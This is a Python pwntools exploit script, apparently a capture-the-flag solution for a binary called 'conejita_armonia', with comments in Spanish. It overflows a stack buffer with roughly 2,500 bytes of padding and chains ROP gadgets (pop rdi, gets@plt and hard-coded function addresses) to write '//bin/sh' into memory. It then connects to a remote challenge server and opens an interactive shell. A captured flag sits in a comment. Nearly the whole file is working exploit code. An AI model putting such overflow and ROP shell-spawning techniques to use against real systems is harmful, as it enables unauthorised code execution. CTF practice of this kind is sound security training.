from pwn import *
import time
binf = ELF("conejita_armonia")
libc = binf.libc
# libc = ELF("libc_32.so.6")

gs = '''
break *0x0000000000401319
'''

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        # return process(binf.path)
        return remote('52.33.132.169',1442) 

context.log_level = "DEBUG"
context.aslr = False

# 2521 de stack!
# luego 2492

f1= p64(0x00000000004011dd)  
f2= p64(0x0000000000401228)  
f3= p64(0x0000000000401273)  
f4= p64(0x00000000004012bf)  
f5= p64(0x000000000040130E)  
f6= p64(0x000000000040132d)  
p0= p64(0x000000000040134d)  
main= p64(0x000000000040138a)  
ret=p64(0x000000000040101a)
system=p64(binf.plt['system'])
comando=p64(0x0000000000404048)
comando2=p64(0x0000000000404050)

pop_rdi=p64(0x00000000004014a3)
endbr64=p64(0x00000000004010e0)
print(binf.plt)

p=start()

leak_rop=ret+pop_rdi+comando+p64(binf.plt['gets'])+ret+p64(binf.sym['main'])+ret


# BINSH = next(libc.search("/bin/sh")) - 64

# print(cyclic_metasploit(5000))
padd1=b'A'*20+b'B'+b'C'*2492+b'X'*8+pop_rdi+comando+p64(binf.plt['gets'])+pop_rdi+comando2+p64(binf.plt['gets'])+ret+f5+f6
# padd1=b'A'*20+b'B'+b'C'*2492+b'XXXXXXXX'+ret+endbr64+f5+b'0xdeadbeef'

padd1+=b'D'*(2521-len(padd1))

print(len(padd1))
# padd2=b'\x90'*0X8
# padd1=cyclic_metasploit(2521)

# haciendo bien las cosas
# exploit=padd1+f1+f2+f3+f4+f5+f6

# directo
# exploit=padd1+system+b'\x6c\x76\x0a'

# otra cosa
exploit=padd1+f1+f2+f3+f4+ret

# exploit+=b'C'*0x1000
p.sendlineafter('brinco y alla voy yo',exploit)
p.recv()
p.sendline('//bin/sh\0x00\x00')
# p.sendline('0xdaadfe0b')
# Hackdef{y Una veZ MaS, TodO esTa baJO conTrOL grAciAs Al GDB, PWNTOOLS y PYTHON}


p.interactive()



#estrategia uno con esto escribir en 0x0000000000404048
# 0x00000000004010a0  gets@plt
# 